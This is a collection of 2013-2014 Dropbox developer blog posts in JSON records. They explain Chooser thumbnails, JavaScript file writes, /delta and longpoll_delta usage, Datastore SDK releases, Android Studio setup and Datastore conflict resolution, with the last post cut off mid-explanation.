{"website": "Dropbox", "title": "Getting different sizes of thumbnails using the JavaScript Chooser", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/getting-different-sizes-of-thumbnails-using-the-javascript-chooser", "abstract": "As mentioned in a post last week , we recently rolled out some improvements to the Chooser JavaScript API. One of the additions in the new library is a new set of thumbnails. Now, in addition to choosing the size of thumbnail you want to generate, you can also choose the mode used (e.g. \"crop\" instead of \"fit\"). You can read the full details in the JavaScript Chooser docs . The Chooser now returns a single thumbnail link, but you can generate all the other thumbnails by modifying the query parameters of that URL. Below is code that converts the returned thumbnail to one that crops the image to 800x800. Note that this code uses jQuery's $.param method: Copy // strip off the existing query parameters\r\nvar baseThumbnail = files[0].thumbnailLink.split('?')[0];\r\n \r\n// add \"?mode=crop&bounding_box=800\"\r\nvar cropped = baseThumbnail + '?' + $.param({ mode: 'crop', bounding_box: 800 }); // Tags Developers Tips Tricks Drop-Ins Images // Copy link Link copied Link copied", "date": "2014-01-17"},
{"website": "Dropbox", "title": "Writing a file with the Dropbox JavaScript SDK", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/writing-a-file-with-the-dropbox-javascript-sdk", "abstract": "A more realistic \"Hello, World!\" I was recently asked for a \"Hello World\" example of writing a file to Dropbox using JavaScript. The Getting Started guide that comes with dropbox.js is probably the most complete resource for this, but in the true spirit of \"Hello, World,\" I thought I'd share a minimal snippet to accomplish the task: Copy var client = new Dropbox.Client({ key: 'YOUR-APP-KEY-HERE' });\r\nclient.authenticate(function () {\r\n    client.writeFile('hello.txt', 'Hello, World!', function () {\r\n        alert('File written!');\r\n    });\r\n}); Note that you'll need to insert your own app key to run this code. This comes from creating an app in the App console . You'll also need to add an \"OAuth redirect URI\" in the App console. This has to exactly match the full URL of your running app. A more realistic \"Hello, World!\" The code above isn't extremely realistic, in a couple ways: It redirects the user to authenticate with Dropbox as soon as they visit the page. It doesn't handle any errors. Notably, the call to authenticate can fail under normal circumstances if the user clicks \"Cancel\" instead of \"Allow\" on the authorization page. A better, more complete version of this code is below. This version only requires authentication when the user clicks the button, and this version also provides some error-handling. As a side note, I'm using the Datastore SDK here. You could instead use dropbox.js from GitHub instead. The Datastore SDK includes the same file functionality. Copy <!doctype html>\r\n<html>\r\n<head>\r\n    <script src=\"https://www.dropbox.com/static/api/dropbox-datastores-1.0-latest.js\"></script>\r\n    <link rel=\"stylesheet\" href=\"style.css\">\r\n</head>\r\n<body>\r\n    <center>\r\n        <button id=\"writeButton\">Click to create <code>hello.txt</code> in Dropbox.</button>\r\n    </center>\r\n \r\n    <script>\r\n        var client = new Dropbox.Client({ key: 'YOUR-APP-KEY-HERE' });\r\n \r\n        function doHelloWorld() {\r\n            client.writeFile('hello.txt', 'Hello, World!', function (error) {\r\n                if (error) {\r\n                    alert('Error: ' + error);\r\n                } else {\r\n                    alert('File written successfully!');\r\n                }\r\n            });\r\n        }\r\n \r\n        // Try to complete OAuth flow.\r\n        client.authenticate({ interactive: false }, function (error, client) {\r\n            if (error) {\r\n                alert('Error: ' + error);\r\n            }\r\n        });\r\n \r\n        if (client.isAuthenticated()) {\r\n            doHelloWorld();\r\n        }\r\n \r\n        document.getElementById('writeButton').onclick = function () {\r\n            client.authenticate(function (error, client) {\r\n                if (error) {\r\n                    alert('Error: ' + error);\r\n                } else {\r\n                    doHelloWorld();\r\n                }\r\n            });\r\n        }\r\n    </script>\r\n</body>\r\n</html> // Tags Developers Api V1 JavaScript Tips Tricks Sample Apps Deprecated // Copy link Link copied Link copied", "date": "2013-12-17"},
{"website": "Dropbox", "title": "Efficiently enumerating Dropbox with /delta", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/efficiently-enumerating-dropbox-with-delta", "abstract": "An example in Python Full source code Update: The Sync and Datastore SDK has been deprecated. Learn more here. Sometimes your app needs to enumerate all the files it can see. (What exactly your app can see depends on the permissions you chose when you created it .) If you're building a mobile or desktop app with the Sync API, you can just call listFolder ( iOS , Android ) recursively. Since the Sync API caches this data, these calls will be nearly instantaneous. If you're using the Core API, though, the analog of calling /metadata repeatedly will result in a network call for every folder in Dropbox. Depending on how many folders there are, this can end up being quite slow. To enumerate all the files in Dropbox efficiently, you should instead call /delta . Although /delta is typically used for ongoing monitoring of changes in a user's Dropbox, the first time you call it (without a cursor parameter), it tells you about every file that already exists. Because it returns a flat list, rather than requiring recursive calls for each folder, calling /delta will result in many fewer calls to the server and be a lot faster. An example in Python As an example of how to use /delta for file enumeration, let's build a simple app that lists the top 10 biggest files in a user's Dropbox.We'll start off by building a list_files() method that returns a dictionary of all files and folders in a user's Dropbox along with their metadata. Handling the response from /delta can be a little tricky. Because /delta is designed for ongoing syncing, each entry it returns is really an instruction that tells your code how to update its internal state. If a returned entry has metadata, it means you should add that metadata to your local state. If a returned entry has no metadata with it, that means you should remove that entry and, in the case of folders, all entries \"under\" that path. Depending on the number of files, you may also get the has_moreflag along with a new cursor. In that case, you should immediately call /delta again to get more changes. The following code handles all of these cases and returns the full dictionary of files and their metadata: Copy def list_files(client, files=None, cursor=None):\r\n if files is None:\r\n files = {}\r\n \r\n has_more = True\r\n \r\n while has_more:\r\n result = client.delta(cursor)\r\n cursor = result['cursor']\r\n has_more = result['has_more']\r\n \r\n for lowercase_path, metadata in result['entries']:\r\n \r\n if metadata is not None:\r\n files[lowercase_path] = metadata\r\n \r\n else:\r\n # no metadata indicates a deletion\r\n \r\n # remove if present\r\n files.pop(lowercase_path, None)\r\n \r\n # in case this was a directory, delete everything under it\r\n for other in files.keys():\r\n if other.startswith(lowercase_path + '/'):\r\n del files[other]\r\n \r\n return files, cursor As an added bonus, this function can also accept an existing dictionary of files and cursor and will then update that dictionary instead of creating a new one. To complete our little example, we need to call this method with a valid DropboxClient object, and then use the results to find the biggest files: Copy from dropbox.client import DropboxClient\r\n \r\n# ...\r\n \r\nfiles = list_files(DropboxClient(token))\r\n \r\nprint 'Top 10 biggest files:'\r\n \r\nfor path, metadata in nlargest(10, files.items(), key=lambda x: x[1]['bytes']):\r\n print 't%s: %d bytes' % (path, metadata['bytes']) That's it! See the full code below if you want to run this yourself. You'll need an access token for your account, which you can either get from your existing code or by following the Core API Python tutorial . If you have any questions or feedback, please share on the developer forum . Full source code Copy import heapq\r\nimport sys\r\n \r\nfrom dropbox.client import DropboxClient\r\n \r\nif len(sys.argv) == 2:\r\n token = sys.argv[1]\r\nelse:\r\n print 'Usage: python app.py <access token>'\r\n sys.exit(1)\r\n \r\ndef list_files(client, files=None, cursor=None):\r\n if files is None:\r\n files = {}\r\n \r\n has_more = True\r\n \r\n while has_more:\r\n result = client.delta(cursor)\r\n cursor = result['cursor']\r\n has_more = result['has_more']\r\n \r\n for lowercase_path, metadata in result['entries']:\r\n \r\n if metadata is not None:\r\n files[lowercase_path] = metadata\r\n \r\n else:\r\n # no metadata indicates a deletion\r\n \r\n # remove if present\r\n files.pop(lowercase_path, None)\r\n \r\n # in case this was a directory, delete everything under it\r\n for other in files.keys():\r\n if other.startswith(lowercase_path + '/'):\r\n del files[other]\r\n \r\n return files, cursor\r\n \r\nfiles, cursor = list_files(DropboxClient(token))\r\n \r\nprint 'Total Dropbox size: %d bytes' % sum([metadata['bytes'] for metadata in files.values()])\r\n \r\nprint\r\n \r\nprint 'Top 10 biggest files:'\r\n \r\nfor path, metadata in heapq.nlargest(10, files.items(), key=lambda x: x[1]['bytes']):\r\n print 't%s: %d bytes' % (path, metadata['bytes']) // Tags Developers Api V1 Tips Tricks Tips and Tricks Deprecated // Copy link Link copied Link copied", "date": "2013-12-10"},
{"website": "Dropbox", "title": "Announcing: OS X support for the Sync API and Datastore API", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/announcing-os-x-support-for-the-sync-api-and-datastore-api", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Today, we're adding beta support for OS X (10.7+) to the Sync API and Datastore API . Now your OS X apps can easily access files and datastores in Dropbox. The new SDK also features a simplified auth flow so your users never have to leave your app. As with our other SDKs, we’ve included example apps for both files and datastores that sync nicely across platforms. For example, now you can watch the Datastore APIs simple task list sync between your Mac app, a JavaScript app in the browser, mobile apps on iOS and Android, and server apps in Python! OS X support is currently in beta so it’s not ready to ship to your users quite yet. As always, please give us your feedback on the developer forum . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-11-26"},
{"website": "Dropbox", "title": "Filtering Dropbox /delta results by path", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/filtering-dropbox-delta-results-by-path", "abstract": "An example in Java The /delta endpoint is useful for Core API apps that need to track changes inside Dropbox. As I wrote in my last post , it can also be used to simply enumerate all the files in Dropbox. With the recent addition of the path_prefix parameter, it can also now be used to enumerate and track changes to a single path. Today we added support in the Java, Ruby, and PHP SDKs for the path_prefix parameter. Supporting in other languages is coming soon. Not much needs to change in your code to start using the path_prefix parameter. In PHP, getDelta now takes an optional path_prefix parameter. Similarly, for Ruby, delta gets an extra optional parameter too. In Java, a new method was introduced called getDeltaWithPathPrefix . An example in Java The following code shows how to use getDeltaWithPathPrefix in Java to monitor changes to a single path in Dropbox. To run this code yourself, you'll need an access token for your account, which you can either get from your existing code or by following the Core API Java tutorial . Copy import com.dropbox.core.*;\r\nimport java.util.Locale;\r\nimport java.lang.Thread;\r\n \r\npublic class PathPrefixDemo {\r\n    public static void main(String[] args) throws DbxException, InterruptedException {\r\n        if (args.length != 2) {\r\n            System.out.println(\"Usage: java PathPrefixDemo <access token> <path>\");\r\n            System.exit(1);\r\n        }\r\n \r\n        String accessToken = args[0];\r\n        String path = args[1];\r\n \r\n        DbxRequestConfig config = new DbxRequestConfig(\r\n            \"PathPrefixBlogPost/1.0\", Locale.getDefault().toString());\r\n \r\n        DbxClient client = new DbxClient(config, accessToken);\r\n \r\n        String cursor = null;\r\n \r\n        while (true) {\r\n            DbxDelta<DbxEntry> result = client.getDeltaWithPathPrefix(cursor, path);\r\n            cursor = result.cursor;\r\n            if (result.reset) {\r\n                System.out.println(\"Reset!\");\r\n            }\r\n            for (DbxDelta.Entry entry : result.entries) {\r\n                if (entry.metadata == null) {\r\n                    System.out.println(\"Deleted: \" + entry.lcPath);\r\n                } else {\r\n                    System.out.println(\"Added or modified: \" + entry.lcPath);\r\n                }\r\n            }\r\n \r\n            if (!result.hasMore) {\r\n                // Avoid a tight loop by sleeping when there are no more changes.\r\n                // TODO: Use /longpoll_delta instead!\r\n                // See https://www.dropbox.com/developers/blog/63\r\n                Thread.sleep(1000);\r\n            }\r\n        }\r\n    }\r\n} As always, if you have any questions or feedback, let us know on the developer forum ! // Tags Developers Tips Tricks Archive // Copy link Link copied Link copied", "date": "2013-12-12"},
{"website": "Dropbox", "title": "Python Datastore SDK beta 3", "author": ["Guido Van Rossum"], "link": "https://dropbox.tech/developers/python-datastore-sdk-beta-3", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. We have another beta for the Python Datastore SDK ready. The big change is that we added APIs to save and restore snapshots of a datastore as JSON (the tktasks.py example shows how to use this). We also changed the query() method to return a set instead of a list, so you can combine result sets using set union and difference operations. Check out the new release! // Tags Developers Announcements Archive // Copy link Link copied Link copied", "date": "2013-12-03"},
{"website": "Dropbox", "title": "Python Datastore SDK beta 2", "author": ["Guido Van Rossum"], "link": "https://dropbox.tech/developers/python-datastore-sdk-beta-2", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Less than two weeks ago we announced a beta Python SDK for the Dropbox Datastore API. We now have an update to this SDK, 2.0-b2. We've fixed a few bugs, improved the docs, added a few API methods, and added two new examples (a command-line script to print the contents of a datastore and a GUI app written using the venerable Tkinter library). The second example inspired us to add a new method, make_cursor_map() , which helps if your app has a background thread that calls await() in a loop and needs to communicate with your main thread (as the example does). We also fixed await()'s return value to match its documentation. :-) Check out the new release! Also note that the Python Datastore SDK is a superset of the core Python SDK. Once it is out of beta it will replace the latter, and you will be able to install it directly from PyPI using pip install dropbox . If you have any feedback, we'd love to hear from you on the API Development forum . // Tags Developers Announcements Archive // Copy link Link copied Link copied", "date": "2013-11-15"},
{"website": "Dropbox", "title": "Dropbox at developer events in November", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dropbox-at-developer-events-in-november", "abstract": "November is a busy month for developer events, and the Dropbox platform team will be at quite a few. Come say hi to us, and follow @dropboxapi on Twitter to hear the latest from the team! ADC (App Developers Conference) – Los Angeles, November 5th-7th This is happening right now! I'm at the conference and will be giving a talk about cloud storage this morning. LAUNCH Hackathon – San Francisco, November 8th-10th This weekend, you can find Dropbox at the LAUNCH Hackathon. I'll be delivering a workshop about the Dropbox API, and we'll give out prizes for the team that makes the best use of Dropbox in their hack. AWS re:Invent – Las Vegas, November 12th-15th Next week, Dropbox will be in Las Vegas for AWS re:Invent 2013. I'll be presenting \"Cloud Storage for App Developers\" on Friday. Dreamforce – San Francisco, November 18th-21st Dropbox will be at Dreamforce in San Francisco in a couple weeks. Look for us at the Dropbox booth. We'll also be delivering a couple talks on the Dropbox API and how to integrate Dropbox into your business processes. The Ultimate Developer Event – Boston, November 20th-22nd Later in the month, I'll be representing Dropbox at The Ultimate Developer Event in Boston. I'll be speaking on Thursday. // Tags Developers Developer Community // Copy link Link copied Link copied", "date": "2013-11-05"},
{"website": "Dropbox", "title": "Low-latency notification of Dropbox file changes", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/low-latency-notification-of-dropbox-file-changes", "abstract": "Today we're introducing a new endpoint to the Core HTTP API called longpoll_delta . This new endpoint uses HTTP long polling to notify the caller when files have changed within a Dropbox user's account. This endpoint is already used by the Sync API on iOS and Android to notice changes as soon as they happen. The new endpoint works in conjunction with the existing delta endpoint. When you call delta , you get back a set of changes as well as a cursor , which you pass with your next call to delta to indicate that you only need changes that occurred after that cursor. Typically, delta is used by polling periodically (generally every five minutes or so) for changes. The new longpoll_delta call lets you avoid periodic polling and achieve low-latency change notification. longpoll_delta accepts a delta cursor and blocks until there are new changes (or a timeout is reached). When the call returns, you can call immediately delta to retrieve those changes. The following sample code uses the new longpoll_delta endpoint together with delta to print updates to the console every time a file is created, modified, or deleted in Dropbox. Note that longpoll_delta isn't yet available in the Python SDK, so I'm calling it \"by hand\" using Kenneth Reitz's excellent Requests library. Hopefully this code gives you a feel for how the new endpoint is used: Copy import dropbox\r\nimport time\r\nimport requests\r\n \r\napp_key = '<YOUR APP KEY>'\r\napp_secret = '<YOUR APP SECRET>'\r\n \r\nflow = dropbox.client.DropboxOAuth2FlowNoRedirect(app_key, app_secret)\r\n \r\nprint 'Go here and \"allow\": %s' % flow.start()\r\ncode = raw_input('Paste in your authorization code: ').strip()\r\n \r\naccess_token, _ = flow.finish(code)\r\n \r\nclient = dropbox.client.DropboxClient(access_token)\r\n \r\ncursor = None\r\nwhile True:\r\n result = client.delta(cursor)\r\n cursor = result['cursor']\r\n if result['reset']:\r\n print 'RESET'\r\n \r\n for path, metadata in result['entries']:\r\n if metadata is not None:\r\n print '%s was created/updated' % path\r\n else:\r\n print '%s was deleted' % path\r\n \r\n # if has_more is true, call delta again immediately\r\n if not result['has_more']:\r\n \r\n changes = False\r\n # poll until there are changes\r\n while not changes:\r\n response = requests.get('https://api-notify.dropbox.com/1/longpoll_delta',\r\n params={\r\n 'cursor': cursor, # latest cursor from delta call\r\n 'timeout': 120 # default is 30 seconds\r\n })\r\n data = response.json()\r\n \r\n changes = data['changes']\r\n if not changes:\r\n print 'Timeout, polling again...'\r\n \r\n backoff = data.get('backoff', None)\r\n if backoff is not None:\r\n print 'Backoff requested. Sleeping for %d seconds...' % backoff\r\n time.sleep(backoff)\r\n print 'Resuming polling...' For more information, read the full documentation for longpoll_delta , and let us know on the developer forum if you have any feedback! // Tags Developers Announcements Api V1 Longpoll Tips Tricks Deprecated // Copy link Link copied Link copied", "date": "2013-11-04"},
{"website": "Dropbox", "title": "Announcing the Python Datastore SDK and HTTP API documentation", "author": ["Guido Van Rossum"], "link": "https://dropbox.tech/developers/announcing-the-python-datastore-sdk-and-http-api-documentation", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. One of the primary benefits of the Datastore API, which left beta last month , is that it syncs data cross-platform. We launched datastores with support for three platforms: iOS, Android, and JavaScript. Today, we're releasing a Python SDK for the Datastore API , which adds support for server-side and desktop apps. This new SDK is open source (MIT license), and we've also released full documentation for the HTTP API underlying all the datastore SDKs. We hope that this enables you to build your own Datastore API for your favorite language (Ruby anyone?). The Python SDK is currently in beta. We don't expect any serious changes, so a stable version should follow soon. To get started with the Python SDK, check out the Python datastores tutorial . To get a quick understanding of the underlying HTTP API, try out our curl-based HTTP API tutorial . If you have feedback, please let us know on the developer forum . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-10-28"},
{"website": "Dropbox", "title": "Datastore API stable release", "author": ["Admin"], "link": "https://dropbox.tech/developers/datastore-api-stable-release", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. The Datastore API is a new way of modeling, syncing, and storing data on Dropbox. Since its initial beta release at this year’s DBX conference , we’ve been hard at work incorporating feedback from developers and fixing bugs. Today, we’re pleased to announce that the Datastore API is no longer in beta, and the first stable releases of iOS, Android, and JavaScript SDKs are now available. Datastores are an easy way to keep an app's per-user data — such as app state, settings, bookmarks, or even saved games — in sync across multiple devices and platforms. You can think of datastores as simple embedded databases that are synced to Dropbox, all free for developers. Here’s the video of the announcement at this year’s DBX: http://vimeo.com/70644595 Best of all, the Datastore API syncs data seamlessly across platforms: iOS Android JavaScript And more platforms coming soon! There’s no limit to how you can use the Datastore API in your app, so take a look at the examples , run through the tutorials , or download the SDK and dive into the code. As always, please share your feedback on the developer forum . P.S. If you’re interested in a peek into the inner workings of datastores, take a look at our blog series on how the Datastore API handles conflicts: Part 1 - Basics of Offline Conflict Handling and Part 2 - Resolving Collisions . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-09-25"},
{"website": "Dropbox", "title": "Checking the datastore sync status in JavaScript", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/checking-the-datastore-sync-status-in-javascript", "abstract": "Preventing navigation when uploads are pending Displaying sync status Update: The Sync and Datastore SDK has been deprecated. Learn more here. When your app makes a change to a datastore, that change is queued up locally and sent to Dropbox asynchronously. This means that there's a period of time between when a change is made and when that change has been uploaded to Dropbox. Because the JavaScript SDK currently provides no local persistence, pending changes will be lost if the user closes the browser tab or navigates away from the page. To prevent users from inadvertently losing changes when they navigate away from your app, you can check the \"sync status\" exposed by the Datastore API and take appropriate action. Preventing navigation when uploads are pending The JavaScript SDK provides a function called getSyncStatus() , which returns an object with an uploading field. If uploading is true , there are pending changes that haven't yet been sent to Dropbox's servers. The following code performs this check in beforeunload to warn the user that their pending updates will be lost if they navigate away from the page: Copy client.getDatastoreManager().openDefaultDatastore(function (error, datastore) {\r\n    ...\r\n    $(window).bind('beforeunload', function () {\r\n        if (datastore.getSyncStatus().uploading) {\r\n            return \"You have pending changes that haven't been synchronized to the server.\";\r\n        }\r\n    });\r\n    ...\r\n}); This code checks the sync status only when the user navigates away from the page. It's also possible to monitor changes to the sync status as they happen, which can be used to display that status to the user. Displaying sync status The Datastore API provides an event that's triggered every time the sync status changes. By listening to the syncStatusChanged event, your code can perform some action when uploading starts or finishes. In the following example, an HTML element is updated to either say \"Pending...\" or \"Synchronized,\" based on the current sync status: Copy client.getDatastoreManager().openDefaultDatastore(function (error, datastore) {\r\n    ...\r\n    $('#status').text('Synchronized');\r\n        datastore.syncStatusChanged.addListener(function () {\r\n            if (datastore.getSyncStatus().uploading) {\r\n                $('#status').text('Pending...');\r\n            } else {\r\n                $('#status').text('Synchronized');\r\n            }\r\n        });\r\n        ...\r\n    }); When connected to the internet, changes will generally be synchronized very fast, making a status indicator more annoying than useful. An alternative to showing the status might be to show the “last save” time. Here’s a code example that does that: Copy var previouslyUploading = false;\r\ndatastore.syncStatusChanged.addListener(function () {\r\n    var uploading = datastore.getSyncStatus().uploading;\r\n    if (previouslyUploading && !uploading) {\r\n        $('#status').text('Last sync: ' + new Date());\r\n    }\r\n    previouslyUploading = uploading;\r\n}); Note that the time is only updated when the uploading flag changes from true to false , meaning an upload has just completed. // Tags Developers Api V1 Tips Tricks Tips and Tricks Deprecated // Copy link Link copied Link copied", "date": "2013-10-07"},
{"website": "Dropbox", "title": "Prepping your app for iOS 7? Dropbox SDKs have you covered", "author": ["Chris Varenhorst"], "link": "https://dropbox.tech/developers/prepping-your-app-for-ios-7-dropbox-sdks-have-you-covered", "abstract": "iOS Chooser now open source Update: The Sync and Datastore SDK has been deprecated. Learn more here. If you're scrambling to get your app updated for iOS 7, don't worry about Dropbox holding you back. The SDKs for the Chooser , Sync API , and Core API have all been updated with iOS 7 friendly UI, as well as backward compatibility with the older iOS 6 design so your Dropbox integrations will look great regardless of which OS version your users are on. Keep in mind that all these SDKs work with the Dropbox app on the client if its installed, and the iOS 7 version of that is a few weeks away, so you'll still see the older UI until it’s updated. And if you’re not able to get your app updated before your users upgrade, not a problem. We tested and confirmed that our previous iOS SDKs will still work fine on iOS 7 without the new iOS 7 UI updates. iOS Chooser now open source Additionally, the iOS Chooser is now properly available as an open source project under the MIT license. The package now includes the source code and we've put everything up on GitHub as well. // Tags Developers Ios Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-09-18"},
{"website": "Dropbox", "title": "Supercharged productivity with Dropbox apps", "author": ["Sean Lynch"], "link": "https://dropbox.tech/developers/supercharged-productivity-with-dropbox-apps", "abstract": "Unless you’re an IT manager, you may not know that we offer Dropbox for Business , which allows large teams and organizations to easily collaborate on work files. People at more than two million businesses use Dropbox at work to share files and collaborate on projects, even more use Dropbox individually to get things done. Power users know the easiest way to supercharge their productivity is by linking their Dropbox to any of the 100,000+ apps our developer community has built on the Dropbox Platform. So we're letting the rest of our users in on the secret with our new Dropbox for Business apps page, a spotlight for just a few of the apps that work well with Dropbox. Each of these apps integrates the Dropbox Platform in their own unique way: Smartsheet added the Chooser to their web app with just a few lines of JavaScript, while CloudOn uses the Core API to connect the full power of Dropbox to their app in the cloud. But these and thousands of other apps connected to Dropbox have one thing in common: they make users super-productive. We're excited to see how you harness the power of the Dropbox Platform to help your users work more efficiently from anywhere. // Tags Developers Announcements Partners // Copy link Link copied Link copied", "date": "2013-09-12"},
{"website": "Dropbox", "title": "Using the Sync API with Android Studio", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/using-the-sync-api-with-android-studio", "abstract": "Add the libraries to your project Package the native libraries Include the Dropbox libraries Enjoy Update: The Sync and Datastore SDK has been deprecated. Learn more here. EDIT [2014/12/04]: The steps here refer to an old version of Android Studio. Updated instructions can now be found as part of the standard Sync SDK setup . Yesterday a developer asked on Stack Overflow how he could use the Dropbox Sync API with Android Studio . Although we mention that you can use other tools, we only provide instructions for using the Android Sync API with Eclipse . Adapting those instructions to Android Studio takes a little effort, particularly because the Sync API includes a native library. Note that the following instructions also apply to the Datastore API. Add the libraries to your project The first step is the same as when using Eclipse. After downloading the SDK, you need to copy the contents of the libs folder into the libs folder of your project. When you're done, your project should look something like this: (Note that android-support-v4.jar was already there from when I created my app and is not part of the Android Sync API.) Package the native libraries This second step is different from what you do with Eclipse. Android Studio uses a tool called Gradle to manage the build process. There's a file called build.gradle in your project that controls things like what libraries are included. Handling native libraries with Gradle is a little tricky. If you search for it, you'll find a few methods of including native libraries using Gradle. I settled on the following, which you should add to the end of your build.gradle file: Copy task nativeLibsToJar(type: Zip) {\r\n    destinationDir file(\"$buildDir/native-libs\")\r\n    baseName 'native-libs'\r\n    extension 'jar'\r\n    from fileTree(dir: 'libs', include: '**/*.so')\r\n    into 'lib/'\r\n}\r\n \r\ntasks.withType(Compile) {\r\n    compileTask -> compileTask.dependsOn(nativeLibsToJar)\r\n} This zips all the .so files (e.g. armeabi/libDropboxSync.so ) into a JAR file under the path lib . That JAR file is placed in the build directory at the path native-libs/native-libs.jar . Note that it's important to use double quotes around $buildDir/native-libs ! In Groovy, the language used by Gradle, double quotes allow for string interpolation. Without them, $buildDir wouldn't be interpreted as a variable and you would instead end up with a directory called $buildDir . Include the Dropbox libraries Once the native libraries have been packaged up, all you need to do is tell Gradle that you want to actually use those libraries. Inside the dependencies section of build.gradle , add the following two dependencies: Copy compile files('libs/dropbox-sync-sdk-android.jar')\r\ncompile files(\"$buildDir/native-libs/native-libs.jar\") Enjoy After rebuilding your project (twice, if necessary, to pick up the new JAR file), you should be able to follow along with the rest of the installation instructions for either the Sync API or the Datastore API . If you run into any trouble, please let us know on the developer forum . // Tags Developers Api V1 Tips Tricks Tips and Tricks Deprecated // Copy link Link copied Link copied", "date": "2013-09-05"},
{"website": "Dropbox", "title": "How the Dropbox Datastore API Handles Conflicts – Part Two: Resolving Collisions", "author": ["Guido Van Rossum"], "link": "https://dropbox.tech/developers/how-the-dropbox-datastore-api-handles-conflicts-part-two-resolving-collisions", "abstract": "Recap Basic Conflict Resolution Algorithm Merging Multiple Changes Optimizations and Simplifications Insert vs. Update Field Deletions Up Next Update: The Sync and Datastore SDK has been deprecated. Learn more here. Recap In my previous post I reviewed the basics of conflict resolution in the Dropbox Datastore API. Go read it if you haven’t already. Oh, OK, I’ll summarize. Changes to datastores are transferred between clients and server in the form of deltas . When two devices both change the contents of a datastore simultaneously, or while one or both of the devices are offline, the server will detect a conflict when the second device connects and attempts to upload its delta. The conflicting delta is rejected without prejudice. The device then has to resolve the conflict and send the server the new delta. I left you with the promise I would show how the client library resolves “interesting” conflicts, a.k.a. collisions , where two devices attempt to change the contents of the same record. Basic Conflict Resolution Algorithm Here’s the basic algorithm the SDK currently uses for conflict resolution. In the future we hope to offer a more flexible API for your application to influence the outcome. We may also change the default treatment of field deletions (see below). The basic conflict resolution algorithm considers one local change and one remote change, where a “change” is an insert, update or delete operation on a single record. A single change may affect multiple fields of the same record. The starting point for the algorithm, at least conceptually, is a snapshot of the datastore for which either change is valid. The output consists of three things: a new snapshot, and “rebased” versions (to borrow a term popularized by Git) of the original local and remote changes. Here’s a picture. By convention, I will draw all local changes as arrows (edges) pointing down, and all remote changes as arrows pointing right. The original state is always represented by the the top left corner (node), and the original changes emanate from this point. The final outcome is shown at the bottom right corner, and the rebased changes are those at the bottom and right of the diagram. We sometimes call such a diagram a “square”: I’ll show how multiple changes are resolved further down. Before the interesting stuff happens, the algorithm weeds out some easy cases: If the table IDs affected by local and remote change differ, the changes commute. If the record IDs differ, the changes commute. If one change deletes the record and the other updates it, the deletion wins. If both are record deletions, the local deletion disappears, being redundant. Updates are merged by field, as explained below. As you may recall from part one, if two changes commute it doesn’t matter in which order we apply them. Two updates to the same record that change different fields also commute; for example: Similarly, if one change is said to “win” the outcome is obvious: Note that deleting a record prevails over an update to the same record; the motivation for this behavior is that operations at a \"higher level\" should win over operations at a \"lower level\", and a record deletion operates at a higher level than a field update. I will now describe what happens when two updates to the same record touch the same field. Let's call this a field collision. Since the algorithm takes everything one field at a time, there are no additional surprises for multiple field collisions, and you've already seen what happens to fields that are affected by only one of the two changes. For field collisions we look at the type of the modifications and the resolution rule set for the field. We also distinguish between local and the remote changes. When resolving a conflict between two changes, one is always designated the local change: this is the one that hasn't been accepted by the server yet (in the first example above, this is \"x:=1\"). The change that was received from the server is called the remote change (in the example, \"x:=2\"). The difference is important because remote changes may already have been observed by other devices. This is also the reason why \"remote\" is the default rule (see below). So how do we resolve the collision in this example? We look at the resolution rule for this field. As you may recall from the docs, there are five possible resolution rules. In this example (local x:=1, remote x:=2), the following table gives the algorithm's output: Rule rebased local rebased remote rebased end state remote (default) NOP (loses) x:=2 (wins) {x=2} local x:=1 (wins) NOP (loses) {x=1} max NOP (loses) x:=2 (wins) {x=2} min x:=1 (wins) NOP (loses) {x=1} sum x:=3 x:=3 {x=3} It should be pretty clear now how all this works. NOP, of course, means \"No Operation\", a.k.a. the null change, which is substituted for an operation that loses or disappears completely. The only case deserving some more explanation is the sum rule. This \"reinterprets\" the changes as additions to the field value in the original state. Since we (conveniently :-) started out with x equal to 0, this rewrites \"x:=1\" as \"add 1 to x\" and \"x:=2\" as \"add 2 to x\". When taken as additions, these changes \"commute\", with a combined effect of \"add 3 to x\" which sets the final value of x to 3 (phew!). However, the server doesn't actually understand \"add\" instructions, so we have to rewrite these back as plain assignments. This rewrites both add operations to \"x:=3\" (check the values at the intermediate states to verify that this all makes sense) and we get the following result, which matches the sum line in the above table: There are many other cases to consider; for example, in part three I will explain how list operations are merged. But first let me explain how the basic algorithm is extended to handle multiple changes. Merging Multiple Changes There's one important aspect of conflict resolution that I've neglected so far, and that's how conflicts are resolved between lists of changes. In particular, the deltas that are actually exchanged between client and server typically contain multiple changes. Let's start with a concrete example. Suppose we have a local delta containing the following changes: update T1:r1 {name=\"James\", age=9} update T1:r1 {pal=\"Leo\"} update T1:r1 {age=10, sick=True} And suppose we have to resolve this against this remote delta: update T1:r1 {name=\"Jim\"} update T1:r1 {sick=False} If we attempt to resolve the whole list of local changes against all of the remote changes together we quickly get a bewildering collection of rebase attempts. Now my brain hurts ! Fortunately, the visual language to talk about conflict resolution that I introduced above (and borrowed from OT) was designed to keep our heads cool in this case: 5-collision-empty The trick is to apply the basic resolution algorithm to a single pair of changes at a time, filling in the \"interior\" arrows in the diagram until it is all filled out. Here's a complete set of transitions showing how this works: 6-collision-fill Note that the order in which you fill in the squares doesn’t really matter, except you can only fill in a square whose top and left edges are known. Here, I went strictly row by row in the diagram (A, B, C, D, E, F), but I could also go column by column (A, C, E, B, D, F), and various zig-zag patterns are also possible (e.g. A, B, C, E, D, F). In theory it’s even possible to parallelize some of the solutions: A, B|C, D|E, F. Let me work out the final solution in the example: 7-collision-example You can verify for yourself that if you take any path following arrows from the original (top left) state to the final (bottom right) state, you will always end up with the same outcome, 